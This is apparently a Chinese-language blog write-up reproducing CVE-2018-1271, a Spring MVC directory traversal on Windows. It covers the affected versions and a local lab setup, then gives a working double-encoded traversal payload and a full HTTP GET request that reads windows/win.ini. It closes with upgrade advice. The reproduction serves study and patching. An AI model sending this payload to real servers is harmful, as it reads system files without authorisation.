Spring MVC目录穿越漏洞复现（CVE-2018-1271）

 漏 洞 简 介 

Spring MVC属于SpringFrameWork的后续产品，已经融合在Spring Web Flow里面。Spring 框架提供了构建 Web 应用程序的全功能 MVC 模块。使用 Spring 可插入的 MVC 架构，从而在使用Spring进行WEB开发时，可以选择使用Spring的Spring MVC框架或集成其他MVC开发框架，如Struts1(现在一般不用)，Struts 2(一般老项目使用)等等。2018年04月05日，Pivotal公布了Spring MVC存在一个目录穿越漏洞(CVE-2018-1271)。当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。

 影 响 版 本 

  • Spring Framework 5.0-5.0.4

  • Spring Framework 4.3-4.3.14

  • 较旧的不受支持的版本

 环 境 搭 建 

该漏洞影响在Windows系统中的系列版本，因此在准备环境时，主要在本地的Windows 10系统上，安装JDK1.8+以及mvn。接下来安装简单应用代码。代码下载地址

https://github.com/spring-projects/spring-mvc-showcase

下载后，修改pom.xml中springframe版本为5.0.0

接着修改

spring-mvc-showcase-master/src/main/java/org/springframework/samples/mvc/config目录下的配置文件WebMvcConfig.java，修改addResourceHandlers方法

修改内容为

registry.addResourceHandler("/resources/**").addResourceLocations("file:./src/main/resources/","/resources/");

最后通过mvn启动该Web项目，执行命令为mvn jetty:run

当显示如下信息时，说明环境已经搭建成功

访问http://127.0.0.1:8080/spring-mvc-showcase/,成功访问应用

 漏 洞 复 现 

构造漏洞利用payload，通过该payload可读取Windows系统盘下的win.ini文件

/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini

构造请求发送至服务器

GET /spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1Host: 10.211.55.8:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1

执行结果如下图所示

可以看到，到这里已经成功地读取到了系统文件，实现目录穿越。

 漏 洞 修 复 

升级Spring，官方已发布安全版本修复该漏洞，安全版本如下：

Spring Framework 5.*（5.0到5.0.4）版本，建议更新到5.0.5版本

Spring Framework 4.3.*（4.3到4.3.14）版本，建议更新到4.3.15版本

不再受支持的旧版本，建议更新到4.3.15版本或5.0.5版本
